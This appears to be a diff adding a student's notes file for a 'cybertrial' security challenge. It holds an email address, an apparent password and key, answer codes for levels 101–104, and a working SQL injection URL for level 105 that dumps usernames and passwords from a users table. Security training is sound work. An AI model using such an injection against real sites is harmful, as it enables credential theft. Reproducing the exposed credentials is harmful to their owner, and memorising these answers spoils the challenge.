@@ -1,0 +1,58 @@
+dxd946@student.bham.ac.uk
+kYzaV3bcdaHpqyUERG
+mykey = a39KvztnMHrEqdXrhyuZddZPmTrLqEcqWRRwrhk4
+
+Level 101 
+1: 7 
+2: 2
+3: 9
+4: 6
+5: 0
+6: 7
+7: 5
+8: 1
+9: 3
+10:6
+
+Level 102
+1: 0
+2: 7
+3: 2 
+4: 3
+5: 1
+6: 9
+7: 4
+8: 8
+9: 0
+10:5
+
+Level 103
+1: 23
+2: 55
+3: 91
+4: 56
+5:
+6:
+7:
+8:
+9:
+10:
+
+level 104
+1: 343/344
+2: 631/632
+3: 962/963
+4: 602/603
+5: 99/100
+6: 541/542
+7: 931/932
+8: 847
+9: 641
+10: 731
+
+
+level 105:
+http://105.cybertrial.co.uk/search?genre=Ireland%27%20AND%201=2%20UNION%20SELECT%20username,%20password,%20id,%20id,%201%20FROM%20users%20;%20--%20
+Will get you all the way through
+
+
